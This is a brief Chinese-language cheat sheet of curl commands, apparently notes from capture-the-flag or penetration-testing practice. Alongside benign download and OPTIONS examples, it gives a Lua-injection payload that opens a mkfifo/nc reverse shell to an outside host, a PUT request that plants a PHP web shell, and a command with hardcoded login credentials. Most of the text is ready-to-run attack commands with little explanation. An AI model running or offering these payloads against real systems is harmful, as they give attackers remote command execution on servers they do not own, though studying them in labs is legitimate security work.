# curl的一些利用

1. curl带凭据访问

```bash
curl -s http://127.0.0.1:3001/~r.michaels/ -u webapi_user:iamthebest
```

1. **curl强制执行get（多用于注入等）**

例子是lua注入引发的命令执行

```bash
curl -G --data-urlencode "city=') os.execute('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.29 8888 >/tmp/f') --" 'http://10.129.18.130/weather/forecast' -s
```

1. 代替wget

```bash
curl -O 【文件】
curl -# -O 【文件】
```

1. 写入文件

```bash
curl -v -X PUT -d '<?php system($_GET["cmd"]);?>' 【写入的文件】
curl --upload-file 【文件名】 -v --url 【写入的文件名】 -0
```

1. 展示允许标头

```bash
curl -v -X OPTIONS 【域名】
```
